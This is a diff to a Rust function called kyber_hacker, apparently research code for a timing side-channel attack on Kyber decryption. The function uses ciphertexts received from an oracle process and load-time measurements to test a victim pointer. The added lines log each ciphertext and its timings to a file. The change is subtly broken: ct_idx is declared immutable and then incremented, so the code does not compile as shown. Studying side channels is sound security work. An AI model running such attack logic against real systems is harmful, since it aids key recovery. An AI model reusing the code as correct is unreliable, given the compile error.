@@ -87,6 +87,7 @@ fn kyber_hacker(
     let mut global_pp_idx: usize = 0;
     let mut global_flush_group_idx = 0;
     let mut result_file = File::create("kyber.txt").unwrap();
+    let mut ct_received = File::create("ct_received.txt").unwrap();
     // let mut stats_file = File::create("kyber_accuracy.txt").unwrap();
     let mut pp_idx = 0;
     let mut pointer_idx = 0;
@@ -463,6 +464,7 @@ fn kyber_hacker(
     // instead of creating a ciphertext here, we rely on a smart process that will submit us
     // with them, we just need to measure the timing, i.e. we are implementing an oracle here
     let oracle_repetitions: u16 = 32;
+    let ct_idx: u16 = 0;
 
     // Send random mask and masked pointer so that constructed ciphertext is decrypted into
     // message containing victim pointer
@@ -481,6 +483,12 @@ fn kyber_hacker(
             break;
         }
         oracle_stream.read_exact(&mut ct).unwrap();
+        write!(ct_received, "idx:{}\n", ct_idx).unwrap();
+        for i in 0..CRYPTO_CIPHERTEXTBYTES as usize {
+            write!(ct_received, "{:#x}, ", ct[i]).unwrap();
+        }
+        write!(ct_received, "\n").unwrap();
+        ct_idx += 1;
 
         let mut times_to_load_test_ptr_atk = vec![];
         for _ in 0..oracle_repetitions {
@@ -531,6 +539,10 @@ fn kyber_hacker(
             stream.write_all(&ct_rand).unwrap();
             stream.read_exact(&mut msg_data).unwrap();
         }
+        for i in 0..oracle_repetitions as usize {
+            write!(ct_received, "{}, ", times_to_load_test_ptr_atk[i]).unwrap();
+        }
+        write!(ct_received, "\n").unwrap();
         let mut successes: u16 = 0;
         for test_time in times_to_load_test_ptr_atk {
             // If time is low, we got target_ptr, i.e. inequality is satisfied
